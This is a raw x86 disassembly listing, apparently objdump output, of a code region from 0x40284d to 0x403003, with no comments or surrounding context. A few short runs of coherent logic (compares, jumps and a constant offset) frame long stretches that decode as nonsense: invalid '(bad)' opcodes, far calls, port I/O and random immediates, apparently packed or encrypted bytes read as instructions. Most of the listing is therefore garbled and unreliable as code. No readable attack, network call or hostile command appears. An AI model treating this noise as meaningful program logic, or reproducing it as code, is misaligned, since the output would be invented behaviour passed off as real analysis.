  40284d:	lea    eax,[eax+eax*1+0x327298]
  402854:	xor    ecx,esi
  402856:	sub    ecx,eax
  402858:	mov    ax,WORD PTR [ebp-0x4]
  40285c:	movzx  eax,ax
  40285f:	cmp    eax,ecx
  402861:	mov    eax,DWORD PTR [ebp+0x10]
  402864:	movzx  ecx,WORD PTR [ebp-0x4]
  402868:	jg     0x402dbb
  40286e:	xor    eax,esi
  402870:	jmp    0x402b0f
  402875:	ret    
  402876:	ror    ecx,cl
  402878:	into   
  402879:	(bad)  
  40287b:	fcmovnbe st,st(1)
  40287d:	out    0x1c,eax
  40287f:	dec    esp
  402880:	stos   BYTE PTR es:[edi],al
  402881:	es fwait
  402883:	mov    ch,0xe5
  402885:	or     BYTE PTR [eax+edi*2],cl
  402888:	js     0x402888
  40288a:	jle    0x402904
  40288c:	js     0x402897
  40288e:	imul   ebp,DWORD PTR [edi],0xb31fa18b
  402894:	mov    esp,0x8e063545
  402899:	xor    al,0x32
  40289b:	add    al,0x44
  40289d:	js     0x402858
  40289f:	push   ebx
  4028a0:	mov    bh,0x89
  4028a2:	jg     0x4028f1
  4028a4:	call   0xd9aa:0x6139d5e4
  4028ab:	lods   eax,DWORD PTR ds:[esi]
  4028ac:	dec    edi
  4028ad:	xchg   edi,eax
  4028ae:	imul   ecx,DWORD PTR [edi+0x58],0xffffffc7
  4028b2:	push   esi
  4028b3:	xor    BYTE PTR [edi+0x30b840a8],0xd6
  4028ba:	xchg   ebp,eax
  4028bb:	xor    ebx,DWORD PTR [esi-0x3ff789c4]
  4028c1:	daa    
  4028c2:	(bad)  
  4028c3:	mov    bh,0xae
  4028c5:	sbb    BYTE PTR [ecx-0x533f5095],al
  4028cb:	xchg   esi,eax
  4028cc:	lds    ebx,FWORD PTR fs:[esi-0x34349bfa]
  4028d3:	or     edx,DWORD PTR [edx-0xd]
  4028d6:	popa   
  4028d7:	or     eax,0x900e8a63
  4028dc:	pop    es
  4028dd:	mov    ds:0x5d7e68c3,eax
  4028e2:	arpl   sp,cx
  4028e4:	fidivr DWORD PTR ds:[edi-0x3fbeb233]
  4028eb:	shl    DWORD PTR [eax-0x2f8bc2c4],0xa1
  4028f2:	xchg   ebp,eax
  4028f3:	loopne 0x40288d
  4028f5:	inc    ecx
  4028f6:	imul   eax,DWORD PTR [ecx-0x52],0x33
  4028fa:	push   ebx
  4028fb:	pop    eax
  4028fc:	fstcw  WORD PTR ds:0x446666d8
  402903:	lods   eax,DWORD PTR ds:[esi]
  402904:	fidiv  WORD PTR [edi+0x7a208665]
  40290a:	inc    esp
  40290b:	retf   0xcea6
  40290e:	xchg   BYTE PTR [ecx-0x7518b205],al
  402914:	jle    0x402900
  402916:	into   
  402917:	mov    DWORD PTR [ecx+eax*8-0x4c],esp
  40291b:	jp     0x402929
  40291d:	inc    eax
  40291e:	sub    eax,0x9d30f4ba
  402923:	mov    edi,0xe79615f0
  402928:	stos   DWORD PTR es:[edi],eax
  402929:	xchg   esi,eax
  40292a:	dec    edi
  40292b:	lods   eax,DWORD PTR ds:[esi]
  40292c:	xchg   esp,eax
  40292d:	imul   ebp,DWORD PTR [edi+0x22],0x62
  402931:	in     eax,dx
  402932:	adc    edi,esp
  402934:	sbb    al,BYTE PTR [ecx+0x35]
  402937:	sub    ah,BYTE PTR [edi+0xb]
  40293a:	push   ebp
  40293b:	rcl    BYTE PTR [edx-0x72],1
  40293e:	add    edi,DWORD PTR [edx-0x57]
  402941:	lea    edi,[esi]
  402943:	fnstcw WORD PTR [ebx-0x2e986acf]
  402949:	(bad)  
  40294a:	cmovns esp,ebp
  40294d:	push   es
  40294e:	mov    eax,0x124cd20b
  402953:	sti    
  402954:	cmp    eax,0x2e96b04c
  402959:	jns    0x402954
  40295b:	into   
  40295c:	sbb    al,0xc7
  40295e:	jne    0x40293b
  402960:	mov    ah,0xd
  402962:	pop    edi
  402963:	adc    al,0xbf
  402965:	pop    ecx
  402966:	add    al,0x51
  402968:	sbb    dl,0x64
  40296b:	pusha  
  40296c:	or     ah,BYTE PTR cs:[edi+0x4d40cc5e]
  402973:	test   BYTE PTR [ebp-0x2cb4fafc],0xe3
  40297a:	mov    ecx,DWORD PTR [ecx+eax*4]
  40297d:	shr    BYTE PTR [esi+ecx*1-0x38],1
  402981:	(bad)
  402984:	sub    cl,BYTE PTR [edi+ebp*4+0x24]
  402988:	imul   edx,DWORD PTR [edi],0x892775de
  40298e:	jecxz  0x4029d0
  402990:	inc    edx
  402991:	push   ebx
  402992:	dec    ebp
  402993:	adc    dl,bh
  402995:	cdq    
  402996:	adc    eax,0xa6c398f9
  40299b:	mov    ah,0xa0
  40299d:	inc    esi
  40299e:	sub    bl,al
  4029a0:	pop    ecx
  4029a1:	and    al,0x87
  4029a3:	nop
  4029a4:	gs ja  0x402964
  4029a7:	adc    ecx,edx
  4029a9:	xlat   BYTE PTR ds:[ebx]
  4029aa:	push   esp
  4029ab:	mov    bh,0x22
  4029ad:	dec    ebp
  4029ae:	in     al,dx
  4029af:	stos   DWORD PTR es:[edi],eax
  4029b0:	outs   dx,DWORD PTR ds:[esi]
  4029b1:	or     al,0xca
  4029b3:	adc    DWORD PTR [esi],0xffffffe3
  4029b6:	sub    al,BYTE PTR [ebx]
  4029b8:	iret   
  4029b9:	daa    
  4029ba:	sbb    eax,0x55ea65fd
  4029bf:	push   ecx
  4029c0:	jae    0x4029db
  4029c2:	add    cl,0x1c
  4029c5:	push   edi
  4029c6:	push   ss
  4029c7:	xchg   esi,eax
  4029c8:	mov    ebx,0xdb389110
  4029cd:	imul   esi,DWORD PTR [ebp-0x5cf54f92],0xc5436a49
  4029d7:	inc    BYTE PTR [edx+0x1c]
  4029da:	jge    0x4029dc
  4029dc:	or     BYTE PTR [ebx],0x81
  4029df:	xchg   edx,eax
  4029e0:	xchg   esi,eax
  4029e1:	jne    0x4029cd
  4029e3:	in     al,dx
  4029e4:	dec    ebp
  4029e5:	(bad)  
  4029e6:	shl    BYTE PTR [edx-0xdb4e593],cl
  4029ec:	test   dl,bh
  4029ee:	in     eax,dx
  4029ef:	out    dx,al
  4029f0:	mov    ecx,0x2eca69
  4029f5:	fbld   TBYTE PTR [edi+eax*4+0x66776e26]
  4029fc:	mov    esi,0x9cdda330
  402a01:	xor    eax,esp
  402a03:	ficomp DWORD PTR [esi+ebx*8+0x74]
  402a07:	ins    BYTE PTR es:[edi],dx
  402a08:	repz adc DWORD PTR [ebp+0x4e],0xffffff93
  402a0d:	retf   0x44a5
  402a10:	or     edx,DWORD PTR [eax+edx*2+0x2d]
  402a14:	mov    fs:0x57498898,al
  402a1a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402a1b:	add    BYTE PTR [edx],ah
  402a1d:	mov    eax,0xb656fab0
  402a22:	or     cl,ch
  402a24:	int3   
  402a25:	pop    edi
  402a26:	or     cl,BYTE PTR [ebx-0x2eb133d6]
  402a2c:	fisub  WORD PTR [ebp-0x6cba861c]
  402a32:	repnz stos DWORD PTR es:[edi],eax
  402a34:	sbb    ebx,DWORD PTR [eax+ecx*2+0x1b]
  402a38:	pop    ds
  402a39:	rcl    BYTE PTR [ecx],1
  402a3b:	(bad)  
  402a3c:	xor    DWORD PTR [esi],eax
  402a3e:	pop    edi
  402a3f:	add    al,0x4c
  402a41:	add    BYTE PTR [edx+edi*8],bh
  402a44:	mov    ds:0x685ff153,eax
  402a49:	dec    edi
  402a4a:	ja     0x402a38
  402a4c:	mov    ds,WORD PTR [ebx]
  402a4e:	cwde   
  402a4f:	mov    esi,0xd5891036
  402a54:	cmp    al,0xc0
  402a56:	call   0x571708aa
  402a5b:	or     eax,0x6682023c
  402a60:	mov    ch,0xd3
  402a62:	shl    BYTE PTR [ebx],cl
  402a64:	mov    WORD PTR cs:[ebp-0x22dfb41f],ss
  402a6b:	pushf  
  402a6c:	jae    0x402ab6
  402a6e:	jg     0x402a2f
  402a70:	rcl    BYTE PTR [ebp+ecx*1+0x4],cl
  402a74:	mov    ecx,0x593f4ca8
  402a79:	mov    ebx,0x72271ff2
  402a7e:	(bad)  [edi]
  402a80:	cmp    DWORD PTR [ebx+0x1e],ebp
  402a83:	(bad)  
  402a84:	imul   ebp,edi,0xffffff88
  402a87:	xchg   ecx,eax
  402a88:	cld    
  402a89:	cmp    esi,DWORD PTR ds:0xe6340556
  402a8f:	and    eax,DWORD PTR [edi+0x4]
  402a92:	pop    esi
  402a93:	jns    0x402a59
  402a95:	iret   
  402a96:	popf   
  402a97:	push   edi
  402a98:	sbb    al,0xdf
  402a9a:	lods   al,BYTE PTR ds:[esi]
  402a9b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402a9c:	sbb    BYTE PTR [eax*1-0x2b2ca153],bl
  402aa3:	mov    ecx,0x79c6250f
  402aa8:	imul   ecx,DWORD PTR [ebx+0x73],0xfffffff3
  402aac:	cmc    
  402aad:	mov    eax,0x8bf0658b
  402ab2:	ret    0x243a
  402ab5:	push   ebx
  402ab6:	and    al,BYTE PTR [edi+0x5759b0b9]
  402abc:	and    al,0x1f
  402abe:	jb     0x402aed
  402ac0:	and    DWORD PTR [esp+edx*1-0x27],edi
  402ac4:	jno    0x402a7d
  402ac6:	xor    BYTE PTR [edx+0x7fe8537b],0x8d
  402acd:	(bad)  
  402acf:	hlt    
  402ad0:	fwait
  402ad1:	bt     DWORD PTR [esi+0x57],ebp
  402ad5:	inc    ebx
  402ad6:	ds cdq 
  402ad8:	or     BYTE PTR [edi],bl
  402ada:	test   eax,0x7b68eaad
  402adf:	fistp  QWORD PTR [edx-0x5eb91d67]
  402ae5:	cmp    BYTE PTR [eax+0x19],0xd2
  402ae9:	xchg   ecx,eax
  402aea:	jg     0x402aae
  402aec:	mov    bl,0x25
  402aee:	aas    
  402aef:	rol    BYTE PTR [ebx+0x1b7ce749],cl
  402af5:	pop    ebp
  402af6:	cmp    BYTE PTR [esi+esi*8],bl
  402af9:	mov    edx,0x35bb4ac9
  402afe:	ss or  ch,cl
  402b01:	fdiv   st,st(7)
  402b03:	sbb    al,0xe0
  402b05:	jmp    0x402af1
  402b07:	jmp    0xfc5fe361
  402b0c:	jb     0x402b3f
  402b0e:	and    ebp,DWORD PTR [ebx]
  402b10:	enter  0x9ae9,0x2
  402b14:	add    BYTE PTR [eax],al
  402b16:	ror    al,0xc2
  402b19:	int    0xda
  402b1b:	rcr    ebx,1
  402b1d:	aad    0x7b
  402b1f:	bound  ebp,QWORD PTR [esi+0x37]
  402b22:	cdq    
  402b23:	mov    eax,fs
  402b25:	mov    ds:0x7878128e,al
  402b2a:	(bad)  
  402b2b:	jle    0x402ba5
  402b2d:	js     0x402ae4
  402b2f:	xchg   DWORD PTR [eax-0x38de9269],esp
  402b35:	mov    ebp,0x6a6ed81d
  402b3a:	mov    bl,0xf2
  402b3c:	xchg   ebx,eax
  402b3d:	cld    
  402b3e:	fbld   TBYTE PTR ds:0xa2f9341c
  402b44:	lods   eax,DWORD PTR ds:[esi]
  402b45:	add    eax,DWORD PTR [esi+0x704f65e1]
  402b4b:	or     al,ah
  402b4d:	jae    0x402b60
  402b4f:	mov    BYTE PTR [esp],dh
  402b52:	rcl    ebp,cl
  402b54:	jl     0x402b5d
  402b56:	pop    esp
  402b57:	ds xchg ecx,eax
  402b59:	xchg   edx,eax
  402b5a:	frstor [esi]
  402b5c:	std    
  402b5d:	jge    0x402b37
  402b5f:	mov    dh,0x87
  402b61:	mov    ecx,0x1e77b3ea
  402b66:	lds    edi,FWORD PTR [esi-0x3b]
  402b69:	pop    eax
  402b6a:	in     eax,0x4c
  402b6c:	mov    dh,0xb2
  402b6e:	gs (bad) 
  402b70:	and    al,0xc2
  402b72:	cmp    dh,BYTE PTR [ecx-0x2f]
  402b75:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402b76:	mov    dh,0x92
  402b78:	or     al,0x10
  402b7a:	mov    WORD PTR [esi],?
  402b7c:	mov    al,0x8e
  402b7e:	sub    dh,BYTE PTR [ecx-0x6040e5af]
  402b84:	cmp    DWORD PTR [ecx-0x47],esi
  402b87:	jl     0x402bcf
  402b89:	std    
  402b8a:	bound  ebx,QWORD PTR [esi+0x42]
  402b8d:	or     DWORD PTR [esp+eiz*4+0x15],edi
  402b91:	aaa    
  402b92:	cli    
  402b93:	pusha  
  402b94:	fwait
  402b95:	in     eax,0xb
  402b97:	or     eax,0x6d4bee9a
  402b9c:	lods   eax,DWORD PTR ds:[esi]
  402b9d:	(bad)  
  402b9e:	sub    al,0x4b
  402ba0:	pop    ds
  402ba1:	push   ss
  402ba2:	fsub   DWORD PTR [eax]
  402ba4:	mov    dl,0x24
  402ba6:	push   cs
  402ba7:	scas   eax,DWORD PTR es:[edi]
  402ba8:	cmp    BYTE PTR [ebp-0x300a8ee8],dl
  402bae:	xchg   esp,eax
  402baf:	(bad)  
  402bb1:	data16 cld 
  402bb3:	and    eax,0xe9fb094c
  402bb8:	test   BYTE PTR [ebx+0x69],bh
  402bbb:	leave  
  402bbc:	mov    ch,0xcc
  402bbe:	cmp    BYTE PTR [ebx+ebx*8],cl
  402bc1:	push   es
  402bc2:	xchg   BYTE PTR ds:0x15a65d89,ch
  402bc8:	push   esi
  402bc9:	sbb    DWORD PTR [edx+0x37a2892b],ecx
  402bcf:	jecxz  0x402b86
  402bd1:	out    dx,al
  402bd2:	retf   
  402bd3:	jns    0x402be6
  402bd5:	call   0x4a5948b
  402bda:	ins    BYTE PTR es:[edi],dx
  402bdb:	gs retf 
  402bdd:	jecxz  0x402c42
  402bdf:	sar    BYTE PTR [esi-0x12],1
  402be2:	lahf   
  402be3:	sub    al,0x63
  402be5:	xchg   edx,eax
  402be6:	and    BYTE PTR [ebp+0x2b05b600],0xae
  402bed:	fs in  al,dx
  402bef:	ficom  WORD PTR [edi+0x62]
  402bf2:	outs   dx,DWORD PTR ds:[esi]
  402bf3:	cmp    BYTE PTR [ecx+0x44],0xd6
  402bf7:	mov    dl,0x37
  402bf9:	xchg   ebx,eax
  402bfa:	fsubrp st(5),st
  402bfc:	call   0xe57f:0x1732c5bc
  402c03:	mov    ebp,0xcc00321b
  402c08:	mov    al,0x24
  402c0a:	xchg   esp,eax
  402c0b:	div    ecx
  402c0d:	push   ebp
  402c0e:	mov    esi,ds
  402c10:	lock sbb DWORD PTR [ecx-0x79],edx
  402c14:	aam    0xeb
  402c16:	add    edi,ebp
  402c18:	push   0xffffffd0
  402c1a:	hlt    
  402c1b:	call   0x57495856
  402c20:	mov    ah,BYTE PTR [edi]
  402c22:	scas   eax,DWORD PTR es:[edi]
  402c23:	inc    eax
  402c24:	jg     0x402c8b
  402c26:	xchg   edx,eax
  402c27:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402c28:	dec    eax
  402c29:	mov    edi,0xd0f39779
  402c2e:	mov    esi,0xe1d119c3
  402c33:	xchg   esp,eax
  402c34:	outs   dx,DWORD PTR ds:[esi]
  402c35:	xor    al,0x6c
  402c37:	mov    ebx,0x83049fad
  402c3c:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  402c3e:	push   es
  402c3f:	mov    WORD PTR [ebp-0x77e010b9],es
  402c45:	add    BYTE PTR [edi],ah
  402c47:	or     ecx,esp
  402c49:	retf   
  402c4a:	sub    dl,ch
  402c4c:	adc    ebp,eax
  402c4e:	mov    BYTE PTR [edi],cl
  402c50:	mov    bh,0xf
  402c52:	jmp    0xe6f1afb7
  402c57:	(bad)  
  402c58:	mov    al,ds:0x1574a09
  402c5d:	xchg   edx,eax
  402c5e:	mov    al,0x1f
  402c60:	mov    al,ds:0xcaee6f0f
  402c65:	inc    edi
  402c66:	pop    edx
  402c67:	mov    ecx,0xf5dfadc6
  402c6c:	jo     0x402c3e
  402c6e:	js     0x402c67
  402c70:	push   edi
  402c71:	jge    0x402bf7
  402c73:	test   al,ah
  402c75:	fstp   DWORD PTR [edx+0x29]
  402c78:	or     al,0xd
  402c7a:	push   edi
  402c7b:	dec    ebx
  402c7c:	push   eax
  402c7d:	xor    al,0xd2
  402c7f:	inc    ecx
  402c80:	inc    esi
  402c81:	iret   
  402c82:	into   
  402c83:	leave  
  402c84:	sbb    al,0xb4
  402c86:	and    cl,BYTE PTR [ecx+0xc]
  402c89:	add    dl,ch
  402c8b:	xchg   edx,eax
  402c8c:	push   es
  402c8d:	pop    es
  402c8e:	and    cl,BYTE PTR ds:0x642e3133
  402c94:	pop    edi
  402c95:	stos   DWORD PTR es:[edi],eax
  402c96:	jp     0x402c64
  402c98:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402c99:	lock adc ebx,DWORD PTR [ecx-0xf]
  402c9d:	enter  0xde81,0x55
  402ca1:	es jb  0x402c25
  402ca4:	dec    edx
  402ca5:	sbb    al,0x6e
  402ca7:	enter  0xe8bc,0xff
  402cab:	int3   
  402cac:	imul   edi,DWORD PTR [ecx+0x2a],0xa9c08af2
  402cb3:	mov    ds:0x157936e1,eax
  402cb8:	inc    esi
  402cb9:	iret   
  402cba:	or     DWORD PTR [edx+0x66],edx
  402cbd:	jne    0x402d2b
  402cbf:	inc    bl
  402cc1:	pop    edx
  402cc2:	(bad)  
  402cc3:	dec    ebp
  402cc4:	(bad)  
  402cc5:	jno    0x402c66
  402cc7:	lea    edx,[edx]
  402cc9:	or     eax,0xb73eb18d
  402cce:	push   edi
  402ccf:	retf   0x56c5
  402cd2:	cld    
  402cd3:	stc    
  402cd4:	cmp    BYTE PTR [ecx+eax*2],dl
  402cd7:	cli    
  402cd8:	popa   
  402cd9:	mov    esi,0xdccf37d3
  402cde:	test   al,0xb3
  402ce0:	pop    es
  402ce1:	nop
  402ce2:	sub    al,0xa7
  402ce4:	(bad)  
  402ce6:	sbb    dh,al
  402ce8:	push   eax
  402ce9:	jmp    0x7db0164f
  402cee:	pop    ecx
  402cef:	inc    edi
  402cf0:	cli    
  402cf1:	imul   ebp,DWORD PTR [esi-0x74058739],0xffffffa8
  402cf8:	adc    BYTE PTR [esi+ecx*8],bl
  402cfb:	loop   0x402cd1
  402cfd:	scas   eax,DWORD PTR es:[edi]
  402cfe:	or     eax,0x64daa74a
  402d03:	cmc    
  402d04:	add    DWORD PTR [edi-0xa840d6d],ebx
  402d0a:	mov    bl,0xe7
  402d0c:	je     0x402cdc
  402d0e:	adc    BYTE PTR [edi-0x71],ah
  402d11:	sar    BYTE PTR [edx+eiz*4-0x5e],0x51
  402d16:	aad    0xd8
  402d18:	iret   
  402d19:	mov    eax,0xe97eabf5
  402d1e:	mov    dh,0xf7
  402d20:	mov    ch,0xca
  402d22:	stos   BYTE PTR es:[edi],al
  402d23:	xlat   BYTE PTR ds:[ebx]
  402d24:	mov    dh,0xc1
  402d26:	arpl   WORD PTR [edx],si
  402d28:	dec    edi
  402d29:	sbb    al,0xb6
  402d2b:	das    
  402d2c:	popf   
  402d2d:	pop    ecx
  402d2e:	push   es
  402d2f:	test   ch,al
  402d31:	hlt    
  402d32:	xor    eax,0xc40b7116
  402d37:	into   
  402d38:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402d39:	pop    ebp
  402d3a:	(bad)  
  402d3b:	jne    0x402d30
  402d3d:	outs   dx,DWORD PTR ds:[esi]
  402d3e:	xchg   ebx,eax
  402d3f:	in     al,0x58
  402d41:	call   0xbf4539ef
  402d46:	sbb    eax,0x8db01d67
  402d4b:	xor    al,0x64
  402d4d:	push   ebx
  402d4e:	out    dx,eax
  402d4f:	not    DWORD PTR [eax]
  402d51:	(bad)  
  402d52:	in     eax,dx
  402d53:	lods   al,BYTE PTR ds:[esi]
  402d54:	cmc    
  402d55:	cdq    
  402d56:	adc    eax,0xa11087df
  402d5b:	aam    0x30
  402d5d:	xchg   esi,eax
  402d5e:	mov    edi,0x9813ff
  402d63:	xlat   BYTE PTR ds:[ebx]
  402d64:	es inc ebp
  402d66:	nop
  402d67:	sbb    al,0xff
  402d69:	mov    ds:0xa20affb5,eax
  402d6e:	mov    BYTE PTR ds:0x6e59fe89,ch
  402d74:	mov    eax,0xdae444cc
  402d79:	jne    0x402d52
  402d7b:	ins    DWORD PTR es:[edi],dx
  402d7c:	jecxz  0x402d58
  402d7e:	or     DWORD PTR [ecx+0x6],ebp
  402d81:	inc    eax
  402d82:	test   al,0x91
  402d84:	or     al,0xfe
  402d86:	clc    
  402d87:	pop    eax
  402d88:	fcmovb st,st(4)
  402d8a:	xor    eax,0x58204c50
  402d8f:	(bad)  
  402d90:	dec    eax
  402d91:	jns    0x402ddf
  402d93:	in     eax,dx
  402d94:	mov    ds:0xcb7b06ba,eax
  402d99:	sub    al,0xc1
  402d9b:	xchg   esi,eax
  402d9c:	inc    eax
  402d9d:	loop   0x402d9f
  402d9f:	std    
  402da0:	add    al,0x3c
  402da2:	mov    edi,0xa5ee5be
  402da7:	jle    0x402d93
  402da9:	mov    ebx,0xe925fbe5
  402dae:	lahf   
  402daf:	out    0x2b,al
  402db1:	iret   
  402db2:	mov    WORD PTR [ebp-0x4],cx
  402db6:	jmp    0x402dc8
  402dbb:	xor    eax,esi
  402dbd:	lea    eax,[eax+ecx*1+0x327298]
  402dc4:	mov    WORD PTR [ebp-0x4],ax
  402dc8:	mov    eax,DWORD PTR [ebp-0xc]
  402dcb:	cmp    eax,ebx
  402dcd:	je     0x403080
  402dd3:	mov    eax,DWORD PTR [ebp-0x8]
  402dd6:	mov    DWORD PTR [eax],0x60341eb0
  402ddc:	jmp    0x404380
  402de1:	jmp    0x403080
  402de6:	(bad)  
  402de7:	leave  
  402de8:	(bad)  
  402de9:	vpsubusw xmm2,xmm4,xmm5
  402ded:	leave  
  402dee:	repnz int 0x29
  402df1:	cld    
  402df2:	jb     0x402dc3
  402df4:	push   cs
  402df5:	test   al,0xc
  402df7:	pop    ss
  402df8:	js     0x402e72
  402dfa:	(bad)  
  402dfb:	jle    0x402e75
  402dfd:	js     0x402e7b
  402dff:	lods   eax,DWORD PTR ds:[esi]
  402e00:	adc    al,bl
  402e02:	mov    ch,0x8
  402e04:	fidiv  WORD PTR [ebx]
  402e06:	in     al,0x5d
  402e08:	gs jb  0x402d8b
  402e0b:	add    al,0xba
  402e0d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402e0e:	and    eax,0xbd4a6208
  402e13:	(bad)  
  402e14:	div    cl
  402e16:	pop    ebp
  402e17:	sbb    al,0x54
  402e19:	int    0x8
  402e1b:	pusha  
  402e1c:	mov    dl,0x8e
  402e1e:	mov    WORD PTR [eax],gs
  402e20:	jae    0x402e53
  402e22:	repnz xor esp,0x46
  402e26:	push   esi
  402e27:	ret    
  402e28:	icebp  
  402e29:	(bad)  
  402e2a:	xor    dh,ch
  402e2c:	adc    dl,cl
  402e2e:	or     DWORD PTR ds:0xe6991919,ebp
  402e34:	in     al,0x2f
  402e36:	test   DWORD PTR [edi+0x34],0xcb1e52c4
  402e3d:	cmp    DWORD PTR [edx-0x5acc5596],esi
  402e43:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402e44:	pop    edx
  402e45:	in     al,0x19
  402e47:	xchg   ebx,eax
  402e48:	scas   eax,DWORD PTR es:[edi]
  402e49:	inc    ebp
  402e4a:	push   esi
  402e4b:	jae    0x402ec3
  402e4d:	es pusha 
  402e4f:	es int 0xf9
  402e52:	mov    dl,0xa1
  402e54:	stos   DWORD PTR es:[edi],eax
  402e55:	mov    dh,0x67
  402e57:	mov    edi,0x62cc1320
  402e5c:	push   ebx
  402e5d:	imul   ecx,DWORD PTR [esi],0x461342d5
  402e63:	in     al,0xd4
  402e65:	popf   
  402e66:	pop    eax
  402e67:	pusha  
  402e68:	adc    DWORD PTR [ebx],0x42c416a3
  402e6e:	imul   eax,DWORD PTR [eax+0x77],0x29
  402e72:	cmc    
  402e73:	mov    ecx,0xd80996d9
  402e78:	mov    al,ds:0x9715bc53
  402e7d:	xlat   BYTE PTR ds:[ebx]
  402e7e:	arpl   sp,bx
  402e80:	cmp    al,0xe6
  402e82:	repnz leave 
  402e84:	xor    esp,eax
  402e86:	dec    ecx
  402e87:	fst    QWORD PTR [edi-0x156ede42]
  402e8d:	xchg   edx,eax
  402e8e:	pop    ds
  402e8f:	fsub   DWORD PTR [edx-0x67c5faa9]
  402e95:	inc    esi
  402e96:	pop    esi
  402e97:	gs mov bl,0x5a
  402e9a:	andnps xmm7,XMMWORD PTR [eax-0x1c40cd6f]
  402ea1:	call   0xb9df:0x5a2b46f6
  402ea8:	add    eax,0x2879a659
  402ead:	pop    es
  402eae:	sbb    ebx,DWORD PTR [ebx+0x7da2371c]
  402eb4:	loopne 0x402ef5
  402eb6:	lds    edx,FWORD PTR [edx+0x6a]
  402eb9:	push   eax
  402eba:	mov    al,ds:0xb9dfc3d8
  402ebf:	mov    cl,0x98
  402ec1:	adc    esi,ecx
  402ec3:	or     al,0x1b
  402ec5:	jbe    0x402ee6
  402ec7:	iret   
  402ec8:	in     al,dx
  402ec9:	aaa    
  402eca:	sub    BYTE PTR [eax+0x65114e3],bl
  402ed0:	xchg   edi,eax
  402ed1:	dec    ebx
  402ed2:	adc    BYTE PTR [eax+0x41],dl
  402ed5:	push   0xffffffd4
  402ed7:	add    BYTE PTR [ebp-0x56006287],ch
  402edd:	xchg   ecx,ecx
  402edf:	mov    cl,0xa
  402ee1:	sbb    eax,0x12ccc018
  402ee7:	pop    fs
  402ee9:	das    
  402eea:	loope  0x402f67
  402eec:	sar    BYTE PTR [ebx],cl
  402eee:	imul   edi,DWORD PTR [ebx-0x3a],0xe4ced628
  402ef5:	xchg   esp,eax
  402ef6:	pop    ebp
  402ef7:	repz xor ebx,DWORD PTR [eax-0x33]
  402efb:	lock pop esp
  402efd:	std    
  402efe:	dec    eax
  402eff:	push   cs
  402f00:	test   eax,0x6a6784fe
  402f05:	mov    ?,WORD PTR [edi+0x38df1641]
  402f0b:	cmc    
  402f0c:	mov    BYTE PTR [edi+eiz*8],ch
  402f0f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402f10:	jmp    DWORD PTR [ecx]
  402f12:	sub    al,0x5d
  402f14:	and    BYTE PTR [ebx],0x21
  402f17:	daa    
  402f18:	stc    
  402f19:	xchg   ebp,eax
  402f1a:	dec    ecx
  402f1b:	xor    eax,0xca10c7d9
  402f20:	test   edx,0xff734b7a
  402f26:	xor    esp,DWORD PTR [ecx-0x13c17250]
  402f2c:	pusha  
  402f2d:	(bad)  
  402f2e:	out    0x52,al
  402f30:	test   dl,ch
  402f32:	push   ds
  402f33:	mov    al,0x30
  402f35:	(bad)  
  402f36:	push   ecx
  402f37:	inc    ecx
  402f38:	mov    WORD PTR [edx],gs
  402f3a:	sub    eax,0xb6b86d0e
  402f3f:	cmp    eax,0xc61c147b
  402f44:	(bad)  
  402f45:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402f46:	adc    dl,BYTE PTR [edx+0x59]
  402f49:	aam    0x15
  402f4b:	lods   al,BYTE PTR ds:[esi]
  402f4c:	inc    esi
  402f4d:	jle    0x402ef9
  402f4f:	pop    ebx
  402f50:	scas   al,BYTE PTR es:[edi]
  402f51:	mov    DWORD PTR [edx-0x6d],esi
  402f54:	(bad)  
  402f55:	jge    0x402f56
  402f57:	imul   esi,edx,0x2adbe625
  402f5d:	mov    bh,0x9f
  402f5f:	sbb    eax,0x24638fc1
  402f64:	jl     0x402f50
  402f66:	xchg   edx,eax
  402f67:	pop    edx
  402f68:	aaa    
  402f69:	xor    BYTE PTR [ecx-0x66],al
  402f6c:	int3   
  402f6d:	mov    edx,0xfd1b0b85
  402f72:	jnp    0x402f1d
  402f74:	add    dl,BYTE PTR [ebp-0x26]
  402f77:	shl    BYTE PTR [ebx+0x4e],cl
  402f7a:	add    bl,BYTE PTR [ecx+0x57]
  402f7d:	push   ds
  402f7e:	add    bh,ah
  402f80:	sti    
  402f81:	and    edx,eax
  402f83:	pop    edx
  402f84:	aaa    
  402f85:	push   cs
  402f86:	das    
  402f87:	mov    ebx,0x50d0dd84
  402f8c:	pop    ecx
  402f8d:	and    cl,BYTE PTR [eax+0x6ad91d06]
  402f93:	rcr    BYTE PTR [edi+0x35],cl
  402f96:	shl    BYTE PTR [ebx+0x2acc1c10],0xfd
  402f9d:	push   cs
  402f9e:	in     al,0x6b
  402fa0:	mov    al,0x7f
  402fa2:	sbb    BYTE PTR [esi+0x37],cl
  402fa5:	cmp    al,0xa3
  402fa7:	or     al,0x36
  402fa9:	mov    eax,0x8a3e7942
  402fae:	mov    eax,ds:0x194ab390
  402fb3:	sar    DWORD PTR [edi-0x281ced9],cl
  402fb9:	mov    dl,0xb3
  402fbb:	mov    dh,0x38
  402fbd:	add    eax,0x6ee804dd
  402fc2:	mov    ecx,0x7b3e14f0
  402fc7:	xor    ch,BYTE PTR [edi]
  402fc9:	out    dx,al
  402fca:	push   eax
  402fcb:	dec    esi
  402fcc:	mov    ah,0x8a
  402fce:	jp     0x402f62
  402fd0:	xchg   esi,eax
  402fd1:	mov    ch,0xcd
  402fd3:	int    0x6c
  402fd5:	in     al,dx
  402fd6:	and    dh,BYTE PTR [ebp-0x13f6721b]
  402fdc:	mov    ds:0x6a5274f5,eax
  402fe1:	adc    esi,DWORD PTR [ebx]
  402fe3:	dec    esp
  402fe4:	stos   BYTE PTR es:[edi],al
  402fe5:	push   ds
  402fe6:	pop    eax
  402fe7:	xchg   edx,eax
  402fe8:	imul   ecx,DWORD PTR [eax+0x671c5358],0xffffffee
  402fef:	pop    edx
  402ff0:	int    0xff
  402ff2:	xor    BYTE PTR [ebx+0x5fde162b],dl
  402ff8:	mov    dh,bh
  402ffa:	sbb    eax,0x550f082b
  402fff:	mov    ah,0x3e
  403001:	sbb    esi,ebp
  403003:	stos   DWORD PTR es:[edi],eax
